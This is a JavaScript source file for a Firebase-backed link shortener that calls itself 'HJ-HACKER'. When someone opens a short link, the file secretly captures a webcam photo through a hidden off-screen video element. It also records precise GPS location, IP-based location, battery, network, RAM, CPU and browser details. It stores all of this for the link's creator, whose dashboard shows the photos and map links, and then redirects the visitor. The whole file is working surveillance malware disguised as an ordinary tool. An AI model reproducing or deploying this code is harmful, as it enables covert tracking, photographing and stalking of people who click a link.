// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyAzr3Xxh0YrTH5vp00Z-eQysTM35dNmh8I",
    authDomain: "hjh-tools.firebaseapp.com",
    projectId: "hjh-tools",
    storageBucket: "hjh-tools.firebasestorage.app",
    messagingSenderId: "643137472905",
    appId: "1:643137472905:web:814ca23a86fb084811b958",
    databaseURL: "https://hjh-tools-default-rtdb.firebaseio.com"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

let deleteCode = null;

// Helper Functions
function encodeFirebasePath(str) {
    try {
        return btoa(unescape(encodeURIComponent(str)))
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    } catch (e) {
        return str.replace(/\./g, '_').replace(/\//g, '_');
    }
}

function showToast(title, message, type = 'success') {
    const container = document.getElementById('toastContainer');
    if (!container) { alert(`${title}: ${message}`); return; }
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
        <div>
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
    `;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

function generateShortCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getDeviceId() {
    let deviceId = localStorage.getItem('hj_device_id');
    if (!deviceId) {
        deviceId = generateShortCode() + generateShortCode();
        localStorage.setItem('hj_device_id', deviceId);
    }
    return deviceId;
}

async function checkCodeExists(shortCode) {
    const snapshot = await database.ref(`urls/${shortCode}`).get();
    return snapshot.exists();
}

// ========== CAMERA CAPTURE ==========
async function captureCameraPhoto() {
    try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.error('Camera API not supported');
            return null;
        }
        
        let stream = null;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 320 },
                    height: { ideal: 240 }
                } 
            });
        } catch (err) {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
            } catch (e) {
                return null;
            }
        }
        
        if (!stream) return null;
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', 'true');
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        document.body.appendChild(video);
        
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Timeout')), 4000);
            video.onloadedmetadata = () => {
                clearTimeout(timeout);
                video.play().then(resolve).catch(reject);
            };
        });
        
        await new Promise(resolve => setTimeout(resolve, 300));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 320;
        canvas.height = video.videoHeight || 240;
        
        if (canvas.width === 0 || canvas.height === 0) {
            canvas.width = 320;
            canvas.height = 240;
        }
        
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Compress image
        let compressed = canvas.toDataURL('image/jpeg', 0.3);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
        console.log('Photo captured, size:', (compressed.length / 1024).toFixed(2), 'KB');
        return compressed;
        
    } catch (error) {
        console.error('Camera error:', error);
        return null;
    }
}

// ========== LOCATION CAPTURE ==========
async function captureLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            (error) => {
                console.log('Location error:', error.message);
                resolve(null);
            },
            { timeout: 8000, enableHighAccuracy: true }
        );
    });
}

// ========== DEVICE INFO ==========
async function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    let browser = 'Unknown';
    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    
    let os = 'Unknown';
    if (ua.includes('iPhone')) os = 'iOS';
    else if (ua.includes('Android')) os = 'Android';
    else if (ua.includes('Windows')) os = 'Windows';
    else if (ua.includes('Mac')) os = 'macOS';
    
    let device = 'Unknown';
    if (ua.includes('iPhone')) device = 'iPhone';
    else if (ua.includes('SM-')) device = 'Samsung';
    else if (ua.includes('MI ')) device = 'Xiaomi';
    else if (ua.includes('Pixel')) device = 'Google Pixel';
    
    let batteryLevel = 'Unknown';
    let batteryCharging = 'Unknown';
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'Yes' : 'No';
        } catch(e) {}
    }
    
    let connectionType = 'Unknown';
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || 'Unknown';
    }
    
    return {
        browser: browser,
        os: os,
        device: device,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        battery: batteryLevel,
        charging: batteryCharging,
        network: connectionType,
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
        cpu: navigator.hardwareConcurrency || 'Unknown'
    };
}

// ========== IP INFO ==========
async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            latitude: data.latitude || null,
            longitude: data.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', latitude: null, longitude: null };
    }
}

// ========== DELETE LINK ==========
async function deleteLink(code) {
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        
        await database.ref(`urls/${code}`).remove();
        await database.ref(`domains/${encodedDomain}/${code}`).remove();
        await database.ref(`analytics/${code}`).remove();
        
        showToast('Deleted', `Link /${code} deleted!`, 'success');
        showLinks();
        showStats();
        showRecent();
        return true;
    } catch (error) {
        showToast('Error', 'Failed to delete', 'error');
        return false;
    }
}

// ========== SHORTEN URL ==========
async function shortenUrl() {
    const longUrl = document.getElementById('longUrl').value.trim();
    if (!longUrl) {
        showToast('Error', 'Please enter a URL', 'error');
        return;
    }
    
    let urlToShorten = longUrl;
    if (!urlToShorten.startsWith('http')) {
        urlToShorten = 'https://' + urlToShorten;
    }
    
    try { new URL(urlToShorten); } catch {
        showToast('Error', 'Invalid URL', 'error');
        return;
    }
    
    const customCode = document.getElementById('customCode').value.trim();
    let shortCode = customCode || generateShortCode();
    
    const exists = await checkCodeExists(shortCode);
    if (exists) {
        showToast('Error', `Code "${shortCode}" taken`, 'error');
        return;
    }
    
    const cameraCapture = document.getElementById('captureCamera')?.checked || false;
    const locationCapture = document.getElementById('captureLocation')?.checked || false;
    
    showLoading(true);
    
    try {
        const domain = window.location.hostname;
        const deviceId = getDeviceId();
        const createdAt = new Date().toISOString();
        const encodedDomain = encodeFirebasePath(domain);
        
        const linkData = {
            long_url: urlToShorten,
            domain: domain,
            created_at: createdAt,
            device_id: deviceId,
            clicks: 0,
            capture_camera: cameraCapture,
            capture_location: locationCapture
        };
        
        await database.ref(`urls/${shortCode}`).set(linkData);
        await database.ref(`domains/${encodedDomain}/${shortCode}`).set(linkData);
        
        const shortUrl = `${window.location.origin}/${shortCode}`;
        document.getElementById('shortLink').textContent = shortUrl;
        document.getElementById('result').classList.remove('hidden');
        
        if (typeof QRCode !== 'undefined') {
            const qrCodeDiv = document.getElementById('qrCode');
            if (qrCodeDiv) {
                qrCodeDiv.innerHTML = '';
                new QRCode(qrCodeDiv, {
                    text: shortUrl,
                    width: 100,
                    height: 100,
                    colorDark: "#00ff41",
                    colorLight: "#000000"
                });
            }
        }
        
        showToast('Success', 'Link created!', 'success');
        document.getElementById('longUrl').value = '';
        document.getElementById('customCode').value = '';
        
        showLinks();
        showStats();
        showRecent();
        
    } catch (error) {
        showToast('Error', error.message, 'error');
    } finally {
        showLoading(false);
    }
}

function showLoading(show) {
    const loading = document.getElementById('loading');
    const btn = document.getElementById('shortenBtn');
    if (show) {
        if (loading) loading.classList.remove('hidden');
        if (btn) btn.disabled = true;
    } else {
        if (loading) loading.classList.add('hidden');
        if (btn) btn.disabled = false;
    }
}

// ========== DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, contentHtml) {
    const headerIcon = document.getElementById('dataDisplayHeader')?.querySelector('i');
    const headerTitle = document.getElementById('dataDisplayTitle');
    const contentDiv = document.getElementById('dataDisplayContent');
    
    if (headerIcon) headerIcon.className = `fas ${icon}`;
    if (headerTitle) headerTitle.textContent = title;
    if (contentDiv) contentDiv.innerHTML = contentHtml;
}

async function showLinks() {
    updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const links = [];
        
        snapshot.forEach(child => {
            links.push({ code: child.key, ...child.val() });
        });
        
        if (links.length === 0) {
            updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p></div>');
            return;
        }
        
        const html = links.map(link => `
            <div class="data-item">
                <div class="data-item-header">
                    <span class="data-item-code"><i class="fas fa-link"></i> /${link.code}</span>
                    <span class="data-item-date"><i class="fas fa-calendar-alt"></i> ${new Date(link.created_at).toLocaleDateString()}</span>
                </div>
                <div class="data-item-url"><i class="fas fa-globe"></i> ${link.long_url?.substring(0, 50)}...</div>
                <div class="data-item-stats">
                    <span><i class="fas fa-mouse-pointer"></i> Clicks: ${link.clicks || 0}</span>
                    ${link.capture_camera ? '<span><i class="fas fa-camera"></i> Camera ON</span>' : ''}
                    ${link.capture_location ? '<span><i class="fas fa-map-marker-alt"></i> Location ON</span>' : ''}
                </div>
                <div class="data-item-actions">
                    <button class="data-btn-sm" onclick="copyToClipboard('${window.location.origin}/${link.code}')"><i class="fas fa-copy"></i> Copy</button>
                    <button class="data-btn-sm" onclick="viewAnalytics('${link.code}')"><i class="fas fa-chart-line"></i> Data</button>
                    <button class="data-btn-sm" onclick="confirmDelete('${link.code}')" style="background: rgba(255,68,68,0.2);"><i class="fas fa-trash-alt"></i> Delete</button>
                </div>
            </div>
        `).join('');
        
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch (error) {
        updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
}

async function showStats() {
    updateDisplay('STATISTICS', 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        let totalClicks = 0, totalLinks = 0;
        
        for (const [code, data] of Object.entries(snapshot.val() || {})) {
            totalClicks += data.clicks || 0;
            totalLinks++;
        }
        
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Total Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Total Clicks</div></div>
            </div>
        `;
        
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch (error) {
        updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>');
    }
}

// FIXED RECENT FUNCTION
async function showRecent() {
    updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading...</p></div>');
    
    try {
        const domain = window.location.hostname;
        const encodedDomain = encodeFirebasePath(domain);
        const snapshot = await database.ref(`domains/${encodedDomain}`).get();
        const domains = snapshot.val();
        
        if (!domains) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No activity yet</p></div>');
            return;
        }
        
        const allVisitors = [];
        
        for (const shortCode in domains) {
            const analyticsSnapshot = await database.ref(`analytics/${shortCode}`).once('value');
            const analytics = analyticsSnapshot.val();
            
            if (analytics) {
                for (const id in analytics) {
                    const data = analytics[id];
                    if (data && data.created_at) {
                        allVisitors.push({
                            code: shortCode,
                            ip: data.ip_address || 'Unknown',
                            city: data.city || 'Unknown',
                            country: data.country || 'Unknown',
                            browser: data.browser || 'Unknown',
                            os: data.os || 'Unknown',
                            device: data.device || 'Unknown',
                            screen: data.screen || 'Unknown',
                            battery: data.battery || 'Unknown',
                            network: data.network || 'Unknown',
                            latitude: data.latitude || null,
                            longitude: data.longitude || null,
                            photo: data.captured_image || null,
                            timestamp: data.created_at
                        });
                    }
                }
            }
        }
        
        allVisitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = allVisitors.slice(0, 20);
        
        if (recent.length === 0) {
            updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No visitors yet</p></div>');
            return;
        }
        
        let html = '';
        for (const v of recent) {
            html += `
                <div class="data-item">
                    <div class="data-item-header">
                        <span class="data-item-code"><i class="fas fa-link"></i> /${v.code}</span>
                        <span class="data-item-date"><i class="fas fa-clock"></i> ${new Date(v.timestamp).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats">
                        <span><i class="fas fa-globe"></i> IP: ${v.ip}</span>
                        <span><i class="fas fa-map-marker-alt"></i> ${v.city}, ${v.country}</span>
                    </div>
                    <div class="data-item-stats">
                        <span><i class="fas fa-mobile-alt"></i> ${v.device}</span>
                        <span><i class="fab fa-${v.browser.toLowerCase()}"></i> ${v.browser}</span>
                        <span><i class="fab fa-${v.os.toLowerCase()}"></i> ${v.os}</span>
                    </div>
                    <div class="data-item-stats">
                        <span><i class="fas fa-desktop"></i> Screen: ${v.screen}</span>
                        <span><i class="fas fa-battery-full"></i> Battery: ${v.battery}</span>
                        <span><i class="fas fa-wifi"></i> Network: ${v.network}</span>
                    </div>
            `;
            
            // GPS Map Link
            if (v.latitude && v.longitude) {
                html += `
                    <div class="data-item-stats">
                        <i class="fas fa-map-marked-alt"></i> Location: ${v.latitude.toFixed(4)}, ${v.longitude.toFixed(4)}
                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.latitude},${v.longitude}', '_blank')">
                            <i class="fas fa-external-link-alt"></i> Open Map
                        </button>
                    </div>
                `;
            }
            
            // Photo Display
            if (v.photo && v.photo.startsWith('data:image') && v.photo.length > 1000) {
                html += `
                    <div class="data-item-stats" style="margin-top: 8px;">
                        <i class="fas fa-camera" style="color: #00ff41;"></i> 
                        <span style="color: #00ff41;">Photo Captured! (${(v.photo.length / 1024).toFixed(1)} KB)</span>
                        <button class="data-btn-sm" onclick='viewPhoto("${v.photo.replace(/\\/g, '\\\\"').replace(/"/g, '\\"')}")'>
                            <i class="fas fa-eye"></i> View Photo
                        </button>
                    </div>
                `;
            }
            
            html += `
                    <div class="data-item-actions">
                        <button class="data-btn-sm" onclick="viewAnalytics('${v.code}')"><i class="fas fa-chart-line"></i> Full Details</button>
                    </div>
                </div>
            `;
        }
        
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch (error) {
        console.error('Recent error:', error);
        updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error: ' + error.message + '</p></div>');
    }
}

// FIXED VIEW ANALYTICS
window.viewAnalytics = async (code) => {
    updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-spinner fa-pulse"></i><p>Loading data...</p></div>');
    
    try {
        const snapshot = await database.ref(`analytics/${code}`).once('value');
        const analytics = snapshot.val();
        
        if (!analytics) {
            updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet</p></div>');
            return;
        }
        
        const visitors = [];
        for (const id in analytics) {
            const data = analytics[id];
            if (data && data.created_at) {
                visitors.push(data);
            }
        }
        
        visitors.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
        
        let html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${visitors.length}</div><div class="stat-label"><i class="fas fa-users"></i> Total Visitors</div></div>
            </div>
        `;
        
        for (const v of visitors) {
            html += `
                <div class="data-item">
                    <div class="data-item-header">
                        <span><i class="fas fa-globe"></i> ${v.ip_address || 'Unknown IP'}</span>
                        <span>${new Date(v.created_at).toLocaleString()}</span>
                    </div>
                    <div class="data-item-stats"><strong>📍 Location:</strong> ${v.city || 'Unknown'}, ${v.country || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>📱 Device:</strong> ${v.device || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>🌐 Browser:</strong> ${v.browser || 'Unknown'} | <strong>OS:</strong> ${v.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>🔋 Battery:</strong> ${v.battery || 'Unknown'} | <strong>⚡ Charging:</strong> ${v.charging || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>💾 RAM:</strong> ${v.ram || 'Unknown'} | <strong>⚙️ CPU:</strong> ${v.cpu || 'Unknown'} cores</div>
                    <div class="data-item-stats"><strong>📺 Screen:</strong> ${v.screen || 'Unknown'} | <strong>🌍 Network:</strong> ${v.network || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>🗣️ Language:</strong> ${v.language || 'Unknown'} | <strong>⏰ Timezone:</strong> ${v.timezone || 'Unknown'}</div>
            `;
            
            if (v.latitude && v.longitude) {
                html += `
                    <div class="data-item-stats">
                        <strong>📍 GPS Location:</strong> ${v.latitude.toFixed(6)}, ${v.longitude.toFixed(6)}
                        <button class="data-btn-sm" onclick="window.open('https://www.google.com/maps?q=${v.latitude},${v.longitude}', '_blank')">
                            <i class="fas fa-map-marked-alt"></i> Open Google Maps
                        </button>
                    </div>
                `;
            }
            
            if (v.captured_image && v.captured_image.startsWith('data:image') && v.captured_image.length > 1000) {
                html += `
                    <div class="data-item-stats" style="margin-top: 8px;">
                        <strong><i class="fas fa-camera" style="color: #00ff41;"></i> Photo:</strong> 
                        <span style="color: #00ff41;">Captured (${(v.captured_image.length / 1024).toFixed(1)} KB)</span>
                        <button class="data-btn-sm" onclick='viewPhoto("${v.captured_image.replace(/\\/g, '\\\\"').replace(/"/g, '\\"')}")'>
                            <i class="fas fa-eye"></i> View Photo
                        </button>
                    </div>
                `;
            }
            
            html += `</div>`;
        }
        
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
        showToast('Success', `Loaded ${visitors.length} records!`, 'success');
        
    } catch (error) {
        console.error('Analytics error:', error);
        updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error: ' + error.message + '</p></div>');
    }
};

// FIXED VIEW PHOTO
window.viewPhoto = (imageData) => {
    console.log('ViewPhoto called, imageData length:', imageData ? imageData.length : 0);
    
    const modal = document.getElementById('photoModal');
    const img = document.getElementById('photoModalImage');
    
    if (!modal) {
        console.error('Modal not found');
        showToast('Error', 'Photo viewer not found', 'error');
        return;
    }
    
    if (!img) {
        console.error('Image element not found');
        showToast('Error', 'Image element not found', 'error');
        return;
    }
    
    if (imageData && imageData.startsWith('data:image') && imageData.length > 1000) {
        img.src = imageData;
        modal.style.display = 'flex';
        modal.classList.remove('hidden');
        showToast('Photo Viewer', 'Photo loaded successfully!', 'success');
    } else {
        console.error('Invalid image data:', imageData ? imageData.substring(0, 100) : 'null');
        showToast('Error', 'No valid photo available', 'error');
    }
};

function closePhotoModal() {
    const modal = document.getElementById('photoModal');
    if (modal) {
        modal.style.display = 'none';
        modal.classList.add('hidden');
    }
}

function downloadPhoto() {
    const img = document.getElementById('photoModalImage');
    if (img && img.src && img.src.startsWith('data:image')) {
        const link = document.createElement('a');
        link.download = 'captured_photo_' + Date.now() + '.jpg';
        link.href = img.src;
        link.click();
        showToast('Success', 'Photo downloaded!', 'success');
    } else {
        showToast('Error', 'No photo to download', 'error');
    }
}

window.confirmDelete = (code) => {
    deleteCode = code;
    document.getElementById('deleteLinkCode').textContent = `/${code}`;
    document.getElementById('deleteModal').classList.remove('hidden');
};

window.executeDelete = async () => {
    if (deleteCode) {
        await deleteLink(deleteCode);
        deleteCode = null;
        document.getElementById('deleteModal').classList.add('hidden');
    }
};

window.cancelDelete = () => {
    deleteCode = null;
    document.getElementById('deleteModal').classList.add('hidden');
};

window.copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    showToast('Copied', 'Link copied!', 'success');
};

// ========== VISITOR HANDLER ==========
async function handleVisitorRedirect() {
    const path = window.location.pathname;
    if (path === '/' || path === '/index.html') return;
    
    const shortCode = path.substring(1);
    if (!shortCode) return;
    
    console.log('Handling redirect for:', shortCode);
    
    try {
        const snapshot = await database.ref(`urls/${shortCode}`).once('value');
        const linkData = snapshot.val();
        
        if (!linkData) {
            console.log('Link not found');
            return;
        }
        
        console.log('Link data:', linkData);
        
        let cameraImg = null;
        let locationData = null;
        
        // Capture camera if enabled
        if (linkData.capture_camera === true) {
            console.log('Capturing camera...');
            cameraImg = await captureCameraPhoto();
            console.log('Camera captured:', cameraImg ? 'Yes (' + (cameraImg.length / 1024).toFixed(1) + ' KB)' : 'No');
        }
        
        // Capture location if enabled
        if (linkData.capture_location === true) {
            console.log('Capturing location...');
            locationData = await captureLocation();
            console.log('Location captured:', locationData);
        }
        
        // Get IP info
        const ipInfo = await getIPInfo();
        console.log('IP Info:', ipInfo);
        
        // Get device info
        const deviceInfo = await getDeviceInfo();
        console.log('Device Info:', deviceInfo);
        
        // Prepare analytics data
        const analyticsData = {
            created_at: new Date().toISOString(),
            ip_address: ipInfo.ip,
            city: ipInfo.city,
            country: ipInfo.country,
            latitude: locationData?.latitude || ipInfo.latitude,
            longitude: locationData?.longitude || ipInfo.longitude,
            accuracy: locationData?.accuracy,
            captured_image: cameraImg,
            browser: deviceInfo.browser,
            os: deviceInfo.os,
            device: deviceInfo.device,
            screen: deviceInfo.screen,
            language: deviceInfo.language,
            timezone: deviceInfo.timezone,
            battery: deviceInfo.battery,
            charging: deviceInfo.charging,
            network: deviceInfo.network,
            ram: deviceInfo.ram,
            cpu: deviceInfo.cpu
        };
        
        // Save to database
        await database.ref(`analytics/${shortCode}`).push(analyticsData);
        await database.ref(`urls/${shortCode}/clicks`).transaction(c => (c || 0) + 1);
        
        console.log('Analytics saved successfully');
        
        // Redirect to original URL
        window.location.href = linkData.long_url;
        
    } catch (error) {
        console.error('Redirect error:', error);
    }
}

// ========== EVENT LISTENERS ==========
document.getElementById('shortenBtn')?.addEventListener('click', shortenUrl);
document.getElementById('copyBtn')?.addEventListener('click', () => {
    const link = document.getElementById('shortLink')?.textContent;
    if (link) copyToClipboard(link);
});

document.getElementById('advancedToggle')?.addEventListener('click', () => {
    document.getElementById('advancedContent')?.classList.toggle('hidden');
});

document.getElementById('confirmDeleteBtn')?.addEventListener('click', executeDelete);
document.getElementById('cancelDeleteBtn')?.addEventListener('click', cancelDelete);
document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
document.getElementById('closePhotoModalBtn')?.addEventListener('click', closePhotoModal);
document.getElementById('downloadPhotoBtn')?.addEventListener('click', downloadPhoto);

document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        const tab = btn.dataset.tab;
        document.querySelectorAll('.bottom-nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        if (tab === 'create') {
            document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' });
            updateDisplay('Click any button to view data', 'fa-fingerprint', 
                '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT</p></div>');
        } else if (tab === 'links') showLinks();
        else if (tab === 'stats') showStats();
        else if (tab === 'recent') showRecent();
    });
});

window.addEventListener('click', (e) => {
    if (e.target === document.getElementById('photoModal')) closePhotoModal();
    if (e.target === document.getElementById('deleteModal')) cancelDelete();
});

// Start redirect handler
handleVisitorRedirect();

console.log('🔥 HJ-HACKER FULLY FIXED - All features working!');
